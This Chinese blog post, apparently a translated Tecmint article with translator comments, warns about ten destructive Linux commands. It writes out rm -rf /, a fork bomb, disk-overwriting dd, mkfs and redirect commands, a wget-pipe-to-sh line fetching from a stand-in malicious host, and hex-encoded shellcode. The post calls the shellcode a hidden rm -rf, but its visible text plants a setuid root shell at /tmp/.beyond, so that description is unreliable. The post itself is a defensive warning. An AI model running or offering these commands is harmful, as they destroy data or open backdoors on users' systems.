---
title: 永远不要在 Linux 执行的 10 个最危险的命令
tags:
  - Linux
  - Shell
url: 140.html
id: 140
categories:
  - 计算机系统
date: 2014-07-17 02:49:25
---

Linux命令行佷有用、很高效，也很有趣，但有时候也很危险，尤其是在你不确定你自己在正 在做什么时候。这篇文章并不打算引来你对Linux或linux 命令行的愤怒。我们只是想让你意识到在你运行某些命令时应该三思而后行。（译注：当然，以下命令通常都是在root权限下才能将愚蠢发挥到无可救药；在普 通用户身份下，破坏的只是自己的一亩三分地。） [![08063106_Sreu](http://storage.veitor.net/uploads/2014/07/08063106_Sreu.jpg)](http://storage.veitor.net/uploads/2014/07/08063106_Sreu.jpg) **1\. rm -rf 命令** rm -rf命令是删除文件夹及其内容最快的方式之一。仅仅一丁点的敲错或无知都可能导致不可恢复的系统崩坏。下列是一些rm 命令的选项。

*   rm　命令在Linux下通常用来删除文件。
*   rm -r 命令递归的删除文件夹，甚至是空的文件夹。（译注：个人认为此处应该是说错了，从常识看，应该是“甚至是非空的文件夹”）
*   rm -f 命令能不经过询问直接删除‘只读文件’。（译注：Linux下删除文件并不在乎该文件是否是只读的，而只是在意其父目录是否有写权限。所以，-f这个参数 只是表示不必一个个删除确认，而是一律悄悄删除。另外，原始的rm命令其实也是没有删除提示的，只是一般的发行版都会将rm通过别名的方式增加-i参数来 要求删除确认，而-f则抑制了这个提示。）
*   rm -rf / : 强制删除根目录下所有东东。（就是说删除完毕后，什么也没有了。。。）
*   rm -rf *:　强制删除当前目录的所有文件。
*   rm -rf . : 强制删除当前文件夹及其子文件夹。

从 现在起，当你要执行rm -rf命令时请留心一点。我们可以在“.bashrc”文件对‘rm‘命令创建rm -i的别名，来预防用 ‘rm‘命令删除文件时的事故，它会要求你确认每一个删除请求。（译注：大多数发行版已经这样做了，如果还没有，请这样做，并在使用-f参数前一定考虑好 你在做什么！译者本人有着血泪的教训啊。） **2\. :(){:|:&};: 命令** 这就是个fork 炸弹的实例。具体操作是通过定义一个名为 ‘:‘的函数，它会调用自己两次，一次在前台另一次运行在后台。它会反复的执行下去直到系统崩溃。 :(){:|:&};: 哦？你确认你要试试么？千万别在公司正式的服务器上实验啊~~ **3\. 命令　> /dev/sda** 上列命令会将某个‘命令‘的输出写到块设备/dev/sda中。该操作会将在块设备中的所有数据块替换为命令写入的原始数据，从而导致整个块设备的数据丢失。 **4\. mv 文件夹 /dev/null** 这 个命令会移动某个‘文件夹‘到/dev/null。在Linux中 /dev/null 或 null 设备是一个特殊的文件，所有写入它的数据都会被清除，然后返回写操作成功。（译注：这就是黑洞啊。当然，要说明的是，通过将文件夹移动到黑洞，并不能阻止 数据恢复软件的救赎，所以，真正的彻底毁灭，需要采用专用的软件或者手法来完成——我知道你肯定有些东西想删除得干干净净的。） # mv /home/user/* /dev/null 上列命令会将User目录所有内容移动到/dev/null，这意味着所有东西都被‘卷入’黑洞　(null)之中。 **5\. wget http://malicious_source -O- | sh** 上列命令会从一个（也许是）恶意源下载一个脚本并执行。Wget命令会下载这个脚本，而sh会（无条件的）执行下载下来的脚本。 注意: 你应该时刻注意你下载包或脚本的源。只能使用那些从可信任的源中下载脚本/程序。（译注：所以，你真的知道你在做什么吗？当遇到这种需要是，我的做法是，先wget下来，然后我去读一读其中到底写了些什么，然后考虑是否执行。） **6\. mkfs.ext3 /dev/sda** 上列命令会格式化块设备‘sda’，你无疑知道在执行上列命令后你的块设备(硬盘驱 动器)会被格式化，崭新的!没有任何数据，直接让你的系统达到不可恢复的阶段。（译注：通常不会直接使用/dev/sda这样的设备，除非是作为raw设 备使用，一般都需要将sda分成类似sda1、sda2这样的分区后才使用。当然，无论你使用sda还是sda1，这样对块设备或分区进行mkfs都是毁 灭性的，上面的数据都会被蒸发了。） **7\. > file** 上列命令常用来清空文件内容（译注：通常也用于记录命令输出。 不过请在执行前，确认输出的文件是空的或者还不存在，否则原来的文件可真是恢复不了了——连数据恢复软件都未必能帮助你了。另外，我想你可能真正想用的是 “>>”，即累加新的输出到文件，而不是刷新那个文件。）。如果用上列执行时输入错误或无知的输入类似 “>xt.conf”　的命令会覆盖配置文件或其他任何的系统配置文件。 **8\. ^foo^bar** 这个命令在我们[十个鲜为人知的 Linux 命令 – Part 3](http://linux.cn/article-2284-1.html)中描述过，用来编辑先前运行的命令而无需重打整个命令。但当用foobar命令时如果你没有彻底检查改变原始命令的风险，这可能导致真正的麻烦。（译注：事实上，这种小技巧是译者认为的，少数史前时代遗留下来的无用而有害的“黑客”技巧。） **9\. dd if=/dev/random of=/dev/sda** 上列命令会向块设备sda写入随机的垃圾文件从而擦出数据。当然！你的系统可能陷入混乱和不可恢复的状态。（译注：记得上面说过mv到黑洞并不能彻底删除数据么？那么这个命令就是给了你一个彻底删除的方法！当然为了保险起见，你可以覆写多次。） **10\. 隐藏命令** 下面的命令其实就是上面第一个命令 (rm -rf)。这里的代码是隐藏在十六进制里的,一个无知的用户可能就会被愚弄。在终端里运行下面命令可能会擦除你的根分区。 这个命令表明通常真正的危险是隐藏的，不会被轻易的检测到。你必须时刻留心你在做什么结果会怎样。不要编译／运行从未知来源的代码。

char esp\[\] \_\_attribute\_\_ ((section(“.text”))) /* e.s.prelease */= “\\xeb\\x3e\\x5b\\x31\\xc0
\\x50\\x54\\x5a\\x83\\xec\\x64\\x68″“\\xff\\xff\\xff\\xff\\x68\\xdf\\xd0\\xdf\\xd9\\x68\\x8d\\x99″“
\\xdf\\x81\\x68\\x8d\\x92\\xdf\\xd2\\x54\\x5e\\xf7\\x16\\xf7″“\\x56\\x04\\xf7\\x56\\x08\\xf7\\x56
\\x0c\\x83\\xc4\\x74\\x56″“\\x8d\\x73\\x08\\x56\\x53\\x54\\x59\\xb0\\x0b\\xcd\\x80\\x31″“\\xc0
\\x40\\xeb\\xf9\\xe8\\xbd\\xff\\xff\\xff\\x2f\\x62\\x69″“\\x6e\\x2f\\x73\\x68\\x00\\x2d\\x63
\\x00″“cp -p /bin/sh /tmp/.beyond; chmod 4755/tmp/.beyond;”;

注意: 不要在你的或你的同学或学校的电脑里的Linux终端或Shell执行以上的任何一个命令。如果你想测试它们，请在虚拟机上运行。任何不和谐或数据丢失，由于运行上面的命令导致你的系统崩溃，文章作者和Tecmint概不负责。（译注：译者和转载网站也不负责~！）